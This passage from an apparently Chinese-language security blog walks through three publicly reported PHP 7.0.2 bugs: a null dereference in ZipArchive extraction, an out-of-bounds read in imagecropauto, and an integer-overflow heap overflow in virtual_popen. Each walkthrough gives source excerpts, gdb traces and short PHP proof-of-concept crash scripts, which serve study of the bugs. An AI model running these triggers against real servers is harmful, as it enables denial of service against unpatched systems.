ssb;</div><div class="line">	char *pathto;</div><div class="line">	size_t pathto_len;</div><div class="line">	int ret, i;</div><div class="line"></div><div class="line">	int nelems;</div><div class="line"></div><div class="line">	if (!self) &#123;</div><div class="line">		RETURN_FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;s|z&quot;, &amp;pathto, &amp;pathto_len, &amp;zval_files) == FAILURE) &#123;</div><div class="line">		return;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if (pathto_len &lt; 1) &#123;</div><div class="line">		RETURN_FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if (php_stream_stat_path_ex(pathto, PHP_STREAM_URL_STAT_QUIET, &amp;ssb, NULL) &lt; 0) &#123;</div><div class="line">			ret = php_stream_mkdir(pathto, 0777,  PHP_STREAM_MKDIR_RECURSIVE, NULL);</div><div class="line">			if (!ret) &#123;</div><div class="line">					RETURN_FALSE;</div><div class="line">			&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	ZIP_FROM_OBJECT(intern, self);</div><div class="line">	if (zval_files &amp;&amp; (Z_TYPE_P(zval_files) != IS_NULL)) &#123;</div><div class="line">		switch (Z_TYPE_P(zval_files)) &#123;</div><div class="line">			case IS_STRING:</div><div class="line">				if (!php_zip_extract_file(intern, pathto, Z_STRVAL_P(zval_files), Z_STRLEN_P(zval_files))) &#123;</div><div class="line">					RETURN_FALSE;</div><div class="line">				&#125;</div><div class="line">				break;</div><div class="line">			case IS_ARRAY:</div><div class="line">				nelems = zend_hash_num_elements(Z_ARRVAL_P(zval_files));</div><div class="line">				if (nelems == 0 ) &#123;</div><div class="line">					RETURN_FALSE;</div><div class="line">				&#125;</div><div class="line">				for (i = 0; i &lt; nelems; i++) &#123;</div><div class="line">					if ((zval_file = zend_hash_index_find(Z_ARRVAL_P(zval_files), i)) != NULL) &#123;</div><div class="line">						switch (Z_TYPE_P(zval_file)) &#123;</div><div class="line">							case IS_LONG:</div><div class="line">								break;</div><div class="line">							case IS_STRING:</div><div class="line">								if (!php_zip_extract_file(intern, pathto, Z_STRVAL_P(zval_file), Z_STRLEN_P(zval_file))) &#123;</div><div class="line">									RETURN_FALSE;</div><div class="line">								&#125;</div><div class="line">								break;</div><div class="line">						&#125;</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				break;</div><div class="line">			case IS_LONG:</div><div class="line">			default:</div><div class="line">				php_error_docref(NULL, E_WARNING, &quot;Invalid argument, expect string or array of strings&quot;);</div><div class="line">				break;</div><div class="line">		&#125;</div><div class="line">	&#125; else &#123;</div><div class="line">		/* Extract all files */</div><div class="line">		int filecount = zip_get_num_files(intern);</div><div class="line"></div><div class="line">		if (filecount == -1) &#123;</div><div class="line">				php_error_docref(NULL, E_WARNING, &quot;Illegal archive&quot;);</div><div class="line">				RETURN_FALSE;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		for (i = 0; i &lt; filecount; i++) &#123;</div><div class="line">			char *file = (char*)zip_get_name(intern, i, ZIP_FL_UNCHANGED);</div><div class="line">			if (!php_zip_extract_file(intern, pathto, file, strlen(file))) &#123;    //这里跟踪进去就行了。</div><div class="line">					RETURN_FALSE;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	RETURN_TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里上面有个判断语句，是else调用了这个函数，可以用gdb自己调试一下，就会知道是在哪里调用了。<br>下面这个函数我就不放完整代码了，就放关键的地方吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">static int php_zip_extract_file(struct zip * za, char *dest, char *file, int file_len)</div><div class="line">&#123;</div><div class="line">	php_stream_statbuf ssb;</div><div class="line">	struct zip_file *zf;</div><div class="line">	struct zip_stat sb;</div><div class="line">	char b[8192];</div><div class="line">	int n, len, ret;</div><div class="line">	php_stream *stream;</div><div class="line">	char *fullpath;</div><div class="line">	char *file_dirname_fullpath;</div><div class="line">	char file_dirname[MAXPATHLEN];</div><div class="line">	size_t dir_len;</div><div class="line">	int is_dir_only = 0;</div><div class="line">	char *path_cleaned;</div><div class="line">	size_t path_cleaned_len;</div><div class="line">	cwd_state new_state;</div><div class="line">	zend_string *file_basename;</div><div class="line"></div><div class="line">	new_state.cwd = CWD_STATE_ALLOC(1);</div><div class="line">	new_state.cwd[0] = &apos;\0&apos;;</div><div class="line">	new_state.cwd_length = 0;</div><div class="line"></div><div class="line">	/* Clean/normlize the path and then transform any path (absolute or relative)</div><div class="line">		 to a path relative to cwd (../../mydir/foo.txt &gt; mydir/foo.txt)</div><div class="line">	 */</div><div class="line">	virtual_file_ex(&amp;new_state, file, NULL, CWD_EXPAND);</div></pre></td></tr></table></figure></p>
<p>下面就是最底层引用空指针的地方。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CWD_API int virtual_file_ex(cwd_state *state, const char *path, verify_path_func verify_path, int use_realpath) /* &#123;&#123;&#123; */</div><div class="line">&#123;</div><div class="line">	int path_length = (int)strlen(path); //这里就造成了段错误。</div></pre></td></tr></table></figure></p>
<p>poc我放不放都无所，参考文章里有，我想说下面的三个函数缺一不可，有可能哪个地方对传入的文件做了检查，不过我没找，所以整个完整的详细过程我也不是很清楚。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$zip = new ZipArchive();</div><div class="line">$zip-&gt;open(&quot;/opt/test.php&quot;,ZIPARCHIVE::CREATE);</div><div class="line">var_dump($zip-&gt;addEmptyDir(&quot;fosadsao&quot;));</div><div class="line">$zip-&gt;extractTo(&quot;sdsadsa&quot;);</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">strlen () at ../sysdeps/x86_64/strlen.S:106</div><div class="line">106	../sysdeps/x86_64/strlen.S: No such file or directory.</div><div class="line">(gdb) bt</div><div class="line">#0  strlen () at ../sysdeps/x86_64/strlen.S:106</div><div class="line">#1  0x000000000084c598 in virtual_file_ex (state=state@entry=0x7fffffff7b90, </div><div class="line">    path=path@entry=0x0, verify_path=verify_path@entry=0x0, </div><div class="line">    use_realpath=use_realpath@entry=0) at /root/php-7.0.2/Zend/zend_virtual_cwd.c:1179</div><div class="line">#2  0x0000000000779595 in php_zip_extract_file (za=za@entry=0x10aecf0, </div><div class="line">    dest=0x7ffff1662498 &quot;sdsadsa&quot;, file=0x0, file_len=&lt;optimized out&gt;)</div><div class="line">    at /root/php-7.0.2/ext/zip/php_zip.c:161</div><div class="line">#3  0x0000000000779ae1 in c_ziparchive_extractTo (execute_data=&lt;optimized out&gt;, </div><div class="line">    return_value=0x7ffff1613100) at /root/php-7.0.2/ext/zip/php_zip.c:2671</div><div class="line">#4  0x00000000008a1574 in ZEND_DO_FCALL_SPEC_HANDLER ()</div><div class="line">    at /root/php-7.0.2/Zend/zend_vm_execute.h:842</div><div class="line">#5  0x000000000085decb in execute_ex (ex=&lt;optimized out&gt;)</div><div class="line">    at /root/php-7.0.2/Zend/zend_vm_execute.h:414</div><div class="line">#6  0x00000000008aed09 in zend_execute (op_array=&lt;optimized out&gt;, </div><div class="line">    return_value=&lt;optimized out&gt;) at /root/php-7.0.2/Zend/zend_vm_execute.h:458</div><div class="line">#7  0x000000000081e477 in zend_execute_scripts (type=type@entry=8, </div><div class="line">    retval=retval@entry=0x0, file_count=file_count@entry=3)</div><div class="line">    at /root/php-7.0.2/Zend/zend.c:1427</div><div class="line">#8  0x00000000007b2960 in php_execute_script (</div><div class="line">    primary_file=primary_file@entry=0x7fffffffd290) at /root/php-7.0.2/main/main.c:2471</div><div class="line">#9  0x00000000008b0b73 in do_cli (argc=2, argv=0xe97a30)</div><div class="line">    at /root/php-7.0.2/sapi/cli/php_cli.c:974</div><div class="line">#10 0x0000000000441480 in main (argc=2, argv=0xe97a30)</div><div class="line">    at /root/php-7.0.2/sapi/cli/php_cli.c:1345</div></pre></td></tr></table></figure>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这次的分享是一次失败的分享，主要是水平有限吧，期待高手来详细解释一下。后面可能会陆续放出double free和UAF的案例，不过关于php的垃圾回收机制我还不太了解，所以UAF的漏洞估计会要很久，不过网上已经有人分析，我如果要将的话也只能选另外一个cve讲讲，原理大致都差不多的，毕竟用C写的。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://bugs.php.net/bug.php?id=71561" target="_blank" rel="external">https://bugs.php.net/bug.php?id=71561</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Out of bounds access]]></title>
      <url>http://yoursite.com/2017/02/18/Out-of-bounds-access/</url>
      <content type="html"><![CDATA[<h1 id="Out-of-bounds-php漏洞挖掘系列三"><a href="#Out-of-bounds-php漏洞挖掘系列三" class="headerlink" title="Out of bounds (php漏洞挖掘系列三)"></a>Out of bounds (php漏洞挖掘系列三)</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>看标题就知道了是数组越界的漏洞，本次要说的是数组越界的漏洞，参考的文章已经写得很清楚了，不过是我把我自己的理解以中文的方式表达出来而已。说来奇怪不知道为什么这个漏洞没上CVE。说个挖数组越界漏洞搞得小技巧，搜索”[“这个数组符号，然后对于出来的结果一个个的去审查吧，不过目前已经很难挖出来了，因为我已经亲自尝试过来，然而就是挖不出来，哈哈。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>不过说废话，直接上函数代码。这次我们逆向思维分析，不是逆向工程那个逆向哈。</p>
<p>看到下面的这段代码没，这里如果不是真彩色的话，就调用后面(im)-&gt;red[(c)，所以等会创建颜色的时候要注意。这里的颜色最大值为256。这里我就不放代码了，自己搜索吧，在gdImagePtrzh这个类型的结构体里面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define gdImageRed(im, c) ((im)-&gt;trueColor ? gdTrueColorGetRed(c) : \</div><div class="line">	(im)-&gt;red[(c)])</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">static int gdColorMatch(gdImagePtr im, int col1, int col2, float threshold)</div><div class="line">&#123;</div><div class="line">	const int dr = gdImageRed(im, col1) - gdImageRed(im, col2); //这里往下都造成了数组越界的问题。</div><div class="line">	const int dg = gdImageGreen(im, col1) - gdImageGreen(im, col2);  </div><div class="line">	const int db = gdImageBlue(im, col1) - gdImageBlue(im, col2);</div><div class="line">	const int da = gdImageAlpha(im, col1) - gdImageAlpha(im, col2);</div><div class="line">	const double dist = sqrt(dr * dr + dg * dg + db * db + da * da);</div><div class="line">	const double dist_perc = sqrt(dist / (255^2 + 255^2 + 255^2));</div><div class="line">	return (dist_perc &lt;= threshold);</div><div class="line">	//return (100.0 * dist / 195075) &lt; threshold;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后网上搜索，调用这个函数的如果检查不到位的话都会触发漏洞，然后下面这个函数调用了gdColorMatach。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">gdImagePtr gdImageCropThreshold(gdImagePtr im, const unsigned int color, const float threshold)</div><div class="line">&#123;</div><div class="line">	const int width = gdImageSX(im);</div><div class="line">	const int height = gdImageSY(im);</div><div class="line"></div><div class="line">	int x,y;</div><div class="line">	int match;</div><div class="line">	gdRect crop;</div><div class="line"></div><div class="line">	crop.x = 0;</div><div class="line">	crop.y = 0;</div><div class="line">	crop.width = 0;</div><div class="line">	crop.height = 0;</div><div class="line"></div><div class="line">	/* Pierre: crop everything sounds bad */</div><div class="line">	if (threshold &gt; 1.0) &#123;</div><div class="line">		return NULL;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	/* TODO: Add gdImageGetRowPtr and works with ptr at the row level</div><div class="line">	 * for the true color and palette images</div><div class="line">	 * new formats will simply work with ptr</div><div class="line">	 */</div><div class="line">	match = 1;</div><div class="line">	for (y = 0; match &amp;&amp; y &lt; height; y++) &#123;</div><div class="line">		for (x = 0; match &amp;&amp; x &lt; width; x++) &#123;</div><div class="line">			match = (gdColorMatch(im, color, gdImageGetPixel(im, x,y), threshold)) &gt; 0;</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>然后再搜索哪个函数调用了这个代码，最终定位到顶层函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">PHP_FUNCTION(imagecropauto)</div><div class="line">&#123;</div><div class="line">	zval *IM;</div><div class="line">	zend_long mode = -1;</div><div class="line">	zend_long color = -1;</div><div class="line">	double threshold = 0.5f;</div><div class="line">	gdImagePtr im;</div><div class="line">	gdImagePtr im_crop;</div><div class="line"></div><div class="line">	if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;r|ldl&quot;, &amp;IM, &amp;mode, &amp;threshold, &amp;color) == FAILURE)  &#123;</div><div class="line">		return;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if ((im = (gdImagePtr)zend_fetch_resource(Z_RES_P(IM), &quot;Image&quot;, le_gd)) == NULL) &#123;</div><div class="line">		RETURN_FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	switch (mode) &#123;</div><div class="line">		case -1:</div><div class="line">			mode = GD_CROP_DEFAULT;</div><div class="line">		case GD_CROP_DEFAULT:</div><div class="line">		case GD_CROP_TRANSPARENT:</div><div class="line">		case GD_CROP_BLACK:</div><div class="line">		case GD_CROP_WHITE:</div><div class="line">		case GD_CROP_SIDES:</div><div class="line">			im_crop = gdImageCropAuto(im, mode);</div><div class="line">			break;</div><div class="line"></div><div class="line">		case GD_CROP_THRESHOLD:</div><div class="line">			if (color &lt; 0) &#123;</div><div class="line">				php_error_docref(NULL, E_WARNING, &quot;Color argument missing with threshold mode&quot;);  //这里做了检查然后没啥卵用。</div><div class="line">				RETURN_FALSE;</div><div class="line">			&#125;</div><div class="line">			im_crop = gdImageCropThreshold(im, color, (float) threshold);  //这里调用了这个函数</div><div class="line">			break;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$image=imagecreate(1000,1020);</div><div class="line">var_dump(imagecropauto($image,IMG_CROP_THRESHOLD,1,8888888));</div></pre></td></tr></table></figure>
<p>我发现了一个奇怪的问题就是，color的数值小一点就会报错，看函数也没调用overflow这个区做安全检查，不知道是哪里出问题了。调试信息放不放都无所谓了。</p>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>本来想找个有趣的数组越界的问题，我记忆中中sqrt函数造成的问题，传进去负数之后会颠倒位置，就造成了最后的结果过大造成数组越界，最终找来找去还是没找到。只能用这个函数做案例了。终于要到驾照上课去了，这边文章就写到这里吧，有问题欢迎指出。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://bugs.php.net/bug.php?id=72494" target="_blank" rel="external">https://bugs.php.net/bug.php?id=72494</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Heap-based buffer overflow]]></title>
      <url>http://yoursite.com/2017/02/17/Heap-based-buffer-overflow/</url>
      <content type="html"><![CDATA[<h1 id="Heap-based-integer-overflow-php漏洞挖掘系列之二"><a href="#Heap-based-integer-overflow-php漏洞挖掘系列之二" class="headerlink" title="Heap-based integer overflow(php漏洞挖掘系列之二)"></a>Heap-based integer overflow(php漏洞挖掘系列之二)</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>这个漏洞是玄武实验室的人挖出来的，我这边做一下分享吧。我们不是漏洞挖掘者，只是漏洞搬运者。好了，进入正题吧，这篇文章主要讲述的是基于堆的缓冲区溢出，找了好久终于找到一个比较简单易懂的漏洞进行分析。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>首先放代码，这段代码在zend_virtual_cwd.c的1853行，可以看出是unix环境使用的函数。然而没啥卵用。这个函数是执行命令的底层调用函数，具体我就不往上找了麻烦，从代码中就可以大致看的出来。php执行命令的函数还是挺多的，我就不列举了，在poc中我用的是system函数。然后就进入漏洞分析环节了。请看代码注释。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">#else /* Unix */</div><div class="line">CWD_API FILE *virtual_popen(const char *command, const char *type) /* &#123;&#123;&#123; */</div><div class="line">&#123;</div><div class="line">	int command_length;  //int型的长度在32位中为0x7fffffff</div><div class="line">	int dir_length, extra = 0;</div><div class="line">	char *command_line;</div><div class="line">	char *ptr, *dir;</div><div class="line">	FILE *retval;</div><div class="line"></div><div class="line">	command_length = strlen(command);  //这里统计命令的字符串长度，</div><div class="line"></div><div class="line">	dir_length = CWDG(cwd).cwd_length; </div><div class="line">	dir = CWDG(cwd).cwd;</div><div class="line">	while (dir_length &gt; 0) &#123;</div><div class="line">		if (*dir == &apos;\&apos;&apos;) extra+=3;</div><div class="line">		dir++;</div><div class="line">		dir_length--;</div><div class="line">	&#125;</div><div class="line">	dir_length = CWDG(cwd).cwd_length;//脚本路径的长度</div><div class="line">	dir = CWDG(cwd).cwd;</div><div class="line"></div><div class="line">	ptr = command_line = (char *) emalloc(command_length + sizeof(&quot;cd &apos;&apos; ; &quot;) + dir_length + extra+1+1);  //这边变成了emalloc(0)，等会看调试信息</div><div class="line">	if (!command_line) &#123;</div><div class="line">		return NULL;</div><div class="line">	&#125;</div><div class="line">	memcpy(ptr, &quot;cd &quot;, sizeof(&quot;cd &quot;)-1);</div><div class="line">	ptr += sizeof(&quot;cd &quot;)-1;</div><div class="line"></div><div class="line">	if (CWDG(cwd).cwd_length == 0) &#123;</div><div class="line">		*ptr++ = DEFAULT_SLASH;</div><div class="line">	&#125; else &#123;</div><div class="line">		*ptr++ = &apos;\&apos;&apos;;</div><div class="line">		while (dir_length &gt; 0) &#123;</div><div class="line">			switch (*dir) &#123;</div><div class="line">			case &apos;\&apos;&apos;:</div><div class="line">				*ptr++ = &apos;\&apos;&apos;;</div><div class="line">				*ptr++ = &apos;\\&apos;;</div><div class="line">				*ptr++ = &apos;\&apos;&apos;;</div><div class="line">				/* fall-through */</div><div class="line">			default:</div><div class="line">				*ptr++ = *dir;</div><div class="line">			&#125;</div><div class="line">			dir++;</div><div class="line">			dir_length--;</div><div class="line">		&#125;</div><div class="line">		*ptr++ = &apos;\&apos;&apos;;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	*ptr++ = &apos; &apos;;</div><div class="line">	*ptr++ = &apos;;&apos;;</div><div class="line">	*ptr++ = &apos; &apos;;</div><div class="line"></div><div class="line">	memcpy(ptr, command, command_length+1);  //这里command_length+1=0xfffffff1 大于申请的堆空间，所以复制后造成溢出</div><div class="line">	retval = popen(command_line, type);</div><div class="line"></div><div class="line">	efree(command_line);</div><div class="line">	return retval;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>gdb调试信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">root@mhn:~# gdb -q --args php-7.0.2/sapi/cli/php -n test.php </div><div class="line">Reading symbols from php-7.0.2/sapi/cli/php...done.</div><div class="line">(gdb) b zend_virtual_cwd.c:1873</div><div class="line">Breakpoint 1 at 0x84d8b4: file /root/php-7.0.2/Zend/zend_virtual_cwd.c, line 1873.</div><div class="line">(gdb) b zend_virtual_cwd.c:1904</div><div class="line">Breakpoint 2 at 0x84d979: file /root/php-7.0.2/Zend/zend_virtual_cwd.c, line 1904.</div><div class="line">(gdb) r</div><div class="line">Starting program: /root/php-7.0.2/sapi/cli/php -n test.php</div><div class="line">[Thread debugging using libthread_db enabled]</div><div class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</div><div class="line"></div><div class="line">Breakpoint 1, virtual_popen (</div><div class="line">    command=command@entry=0x7ffef1200018 &apos;/&apos; &lt;repeats 200 times&gt;..., </div><div class="line">    type=type@entry=0xae66bb &quot;r&quot;) at /root/php-7.0.2/Zend/zend_virtual_cwd.c:1873</div><div class="line">1873		ptr = command_line = (char *) emalloc(command_length + sizeof(&quot;cd &apos;&apos; ; &quot;) + dir_length + extra+1+1);</div><div class="line">(gdb) p command_length</div><div class="line">$1 = -16</div><div class="line">(gdb) p sizeof(&quot;cd &apos;&apos; ; &quot;)</div><div class="line">$2 = 9</div><div class="line">(gdb) p dir_length</div><div class="line">$3 = 5</div><div class="line">(gdb) p extra</div><div class="line">$4 = 0    //可以看到这边加起来为0，其实这样比较容易理解。</div><div class="line"></div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line"></div><div class="line">Breakpoint 2, virtual_popen (</div><div class="line">    command=command@entry=0x7ffef1200018 &apos;/&apos; &lt;repeats 200 times&gt;..., </div><div class="line">    type=type@entry=0xae66bb &quot;r&quot;) at /root/php-7.0.2/Zend/zend_virtual_cwd.c:1904</div><div class="line">1904		memcpy(ptr, command, command_length+1);</div><div class="line">(gdb) p command_length+1</div><div class="line">$5 = -15</div><div class="line">(gdb) n</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">__memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:152</div><div class="line">152	../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;?php</div><div class="line">    ini_set(&apos;memory_limit&apos;, -1);</div><div class="line">    $cmd = str_repeat(&quot;/&quot;, 0xfffffff0);</div><div class="line">    system($cmd);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>我想看到这里也看明白了，正是因为command_length的类型为int，后面再malloc中又转化size_t类型，然后整数溢出了。poc也就那样，很容易理解。不过在linux上的exp还没怎么学习过，后续可能会学习一下。</p>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这种漏洞现在感觉也很难挖，我看了好几天都没找出一个漏洞，也许因为功力不够吧。如果本章内容讲解错误，欢迎指出。我qq499671216。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://bugs.php.net/bug.php?id=73025" target="_blank" rel="external">https://bugs.php.net/bug.php?id=73025</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[stack-based integer overflow]]></title>
      <url>http://yoursite.com/2017/02/16/stack-based-integer-overflow/</url>
      <content type="html"><![CDATA[<h1 id="Stack-based-integer-overlow（php漏洞挖掘系列之一）"><a href="#Stack-based-integer-overlow（php漏洞挖掘系列之一）" class="headerlink" title="Stack-based integer overlow（php漏洞挖掘系列之一）"></a>Stack-based integer overlow（php漏洞挖掘系列之一）</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>首先声明这些漏洞不是我挖的，我想挖但是挖不出来，蛋疼。本次讲解栈溢出漏洞，这个漏洞是比较常见的漏洞，现在不太好挖了，变量跟踪的你头痛死，没有啥好工具，只能人工慢慢的看，可能我孤陋寡闻吧。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>首先下载源码<a href="http://php.net/releases/，然后编译安装，版本可以低一点，往后的漏洞这个版本都是没打补丁的。环境采用ubuntu和编译版本的php7.0.2，只有linux才有符号表，windows下不好调试，虽然方便的多。现在正式开始吧。" target="_blank" rel="external">http://php.net/releases/，然后编译安装，版本可以低一点，往后的漏洞这个版本都是没打补丁的。环境采用ubuntu和编译版本的php7.0.2，只有linux才有符号表，windows下不好调试，虽然方便的多。现在正式开始吧。</a></p>
<p>定位到漏洞函数代码 /ext/gd/gd.c:2222<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div 